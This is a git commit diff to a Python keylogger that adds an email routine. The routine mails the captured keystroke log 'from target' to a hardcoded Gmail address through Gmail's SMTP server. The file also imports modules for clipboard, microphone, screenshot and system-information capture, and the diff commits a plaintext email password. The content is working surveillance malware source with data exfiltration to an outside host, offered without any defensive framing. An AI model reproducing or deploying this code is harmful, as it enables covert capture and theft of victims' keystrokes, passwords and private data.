dc355317d80cb4607c14051350a1b3678d3cb88e
Seyon <suriyaseyon6@gmail.com>
2023-07-27 08:33:55 +0530

    email functionality added

--- Project/KeyLogger.py
+++ Project/KeyLogger.py
@@ -6,41 +6,90 @@ from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
-    # to collect computer info
+# to collect computer info
 import socket
 import platform
 
-    # the clipboard
+# the clipboard
 import win32clipboard
 
-    # grab keystrokes
+# grab keystrokes
 from pynput.keyboard import Key, Listener
 
-    # track time
+# track time
 import time
 import os
 
-    # microphone capabilities
+# microphone capabilities
 from scipy.io.wavfile import write
 import sounddevice as sd
 
-    # to encrypt files
+# to encrypt files
 from cryptography.fernet import Fernet
 
-import getpass              # to get usernames
-from requests import get    # to get computer information
+import getpass  # to get usernames
+from requests import get  # to get computer information
 
-from multiprocessing import Process, freeze_support         # to get one screenshot at a time
-from PIL import ImageGrab                                   # to grab images
-
+from multiprocessing import Process, freeze_support  # to get one screenshot at a time
+from PIL import ImageGrab  # to grab images
 
 keys_information = "key_log.txt"
+email_address = "vikramathithyan99@gmail.com"
+password = "Vedha2018"
+
+toaddr = "vikramathithyan99@gmail.com"
 
 file_path = "F:\\Coding practise\\Python\\KeyLogger\\Project"
 extend = "\\"
 
+
+# function to send the key_log.txt file through email from target
+def send_mail(filename, attachment, toaddr):
+    fromaddr = email_address
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+
+    p.set_payload(attachment.read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+
+send_mail(keys_information, file_path + extend + keys_information, toaddr)
+
 count = 0
-keys = [] # each pressed key will be appended here
+keys = []  # each pressed key will be appended here
+
 
 # function to print and append pressed key to keys list
 def on_press(key):
@@ -53,6 +102,7 @@ def on_press(key):
         count = 0
         write_file(keys)
         keys = []
+
 
 # function to write the keys to key_log.txt file
 def write_file(keys):
@@ -68,11 +118,13 @@ def write_file(keys):
                 f.write(k)
                 f.close()
 
+
 # function to exit KeyLogger
 def on_release(key):
     if key == Key.esc:
         return False
 
+
 # calling listener
-with Listener(on_press = on_press, on_release = on_release) as listener:
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
